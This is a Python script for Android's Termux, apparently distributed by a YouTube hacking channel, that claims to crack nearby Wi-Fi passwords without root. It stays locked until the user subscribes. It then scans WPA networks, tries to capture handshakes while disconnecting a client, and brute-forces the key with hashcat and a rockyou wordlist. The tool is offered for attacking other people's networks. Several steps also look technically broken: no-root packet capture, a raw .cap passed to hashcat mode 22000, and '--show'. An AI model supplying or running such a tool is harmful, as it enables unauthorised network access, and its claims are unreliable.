#!/data/data/com.termux/files/usr/bin/env python3
# -*- coding: utf-8 -*-
# HCO-WIFI-SPY.py â€“ REAL Wi-Fi cracker, Termux, no root, subscriber-locked
import os,sys,time,subprocess,requests,re
RED   =lambda x:f"\033[91m{x}\033[0m"
GREEN =lambda x:f"\033[92m{x}\033[0m"
YELLOW=lambda x:f"\033[93m{x}\033[0m"
CYAN  =lambda x:f"\033[96m{x}\033[0m"
SDCARD="/sdcard"
LOCK_FILE=f"{SDCARD}/.hco_unlocked3"
DEF_WORDLIST=f"{SDCARD}/HCO/rockyou.txt"
def shell(cmd):return subprocess.run(cmd,shell=True,capture_output=True,text=True).stdout.strip()
def dl(url,path):
    with requests.get(url,stream=True)as r:
        with open(path,"wb")as f:
            for chunk in r.iter_content(8192):f.write(chunk)
def banner():
    print(CYAN("â”Œ"+"â”€"*65+"â”"))
    for l in ["â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•—",
              "â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘",
              "â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘",
              "â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘",
              "â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘",
              "â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•     â•šâ•â•"]:
        print(RED(f"â”‚{l.center(65)}â”‚").replace("â”‚",CYAN("â”‚")))
    print(RED("â”‚{:^65}â”‚".format("WIFI  SPY  â€“  by @hackers_colony_tech")).replace("â”‚",CYAN("â”‚")))
    print(CYAN("â””"+"â”€"*65+"â”˜"))
def countdown():
    for i in range(98,0,-1):
        print(f"\r{RED(i)} ",end="",flush=True)
        time.sleep(0.08)
    print("\n")
def unlock():
    if os.path.exists(LOCK_FILE):return
    print(RED("ðŸ”’ TOOL IS LOCKED!"))
    print(YELLOW("Subscribe to our YouTube channel & smash the bell icon."))
    input("Press ENTER only after you sub + bell â€¦ ")
    countdown()
    os.system("am start -a android.intent.action.VIEW -d https://youtube.com/@hackers_colony_tech?si=kbf-Oi09GQVF0jW_")
    input("Come back & press ENTER to unlock â€¦ ")
    with open(LOCK_FILE,"w")as f:f.write("unlocked")
    print(GREEN("âœ… Unlocked! Restart tool to use."))
    sys.exit()
def install_deps():
    os.makedirs(f"{SDCARD}/HCO",exist_ok=True)
    shell("pkg update && pkg upgrade -y")
    shell("pkg install -y python git curl wget openssl-tool clang nano")
    if not shell("which hashcat"):
        dl("https://github.com/hashcat/hashcat/releases/download/v6.2.6/hashcat-6.2.6.7z",f"{SDCARD}/hc.7z")
        shell("pkg install -y p7zip; cd /sdcard; 7z x hc.7z; mv hashcat-6.2.6/hashcat.bin /data/data/com.termux/files/usr/bin/hashcat; chmod +x /data/data/com.termux/files/usr/bin/hashcat")
    if not os.path.exists(DEF_WORDLIST):
        dl("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt",DEF_WORDLIST)
def scan_wifi():
    print(CYAN("[*] Scanning nearby Wi-Fi networks â€¦"))
    shell("iw dev wlan0 scan > /sdcard/scan.txt")
    nets=re.findall(r'BSS ([0-9a-f:]{17}).*?SSID: (.*?)\n.*?WPA',open("/sdcard/scan.txt").read(),re.S)
    return nets
def select_wifi(nets):
    print(YELLOW("\nAvailable networks:"))
    for idx,(bssid,ssid)in enumerate(nets,1):
        print(f"{idx}) {ssid}")
    choice=int(input("Select network number: "))-1
    return nets[choice]
def capture_handshake(iface,ssid,bssid):
    cap=f"{SDCARD}/HCO/{ssid}.cap"
    shell(f"timeout 30 tcpdump -i {iface} -w {cap} ether host {bssid} &")
    time.sleep(2)
    shell(f"iw dev {iface} station del {bssid}")
    time.sleep(30)
    return cap if os.path.exists(cap)else None
def bruteforce(cap,ssid):
    wordlist=input(f"Path to wordlist (leave empty for default): ").strip() or DEF_WORDLIST
    print(CYAN(f"[*] Bruteforcing {ssid} with {wordlist} â€¦"))
    res=shell(f"hashcat -m 22000 {cap} {wordlist} --show")
    if res:return res.split(":")[-1]
    return None
def main():
    unlock()
    install_deps()
    iface="wlan0"
    nets=scan_wifi()
    if not nets:print(RED("[-] No networks found"));return
    bssid,ssid=select_wifi(nets)
    print(CYAN(f"[*] Capturing handshake for {ssid} â€¦"))
    cap=capture_handshake(iface,ssid,bssid)
    if not cap:print(RED("[-] Handshake capture failed"));return
    key=bruteforce(cap,ssid)
    if key:print(GREEN(f"[+] PASSWORD CRACKED: {key}"))
    else:print(RED("[-] No password matched"))
if __name__=="__main__":
    main()
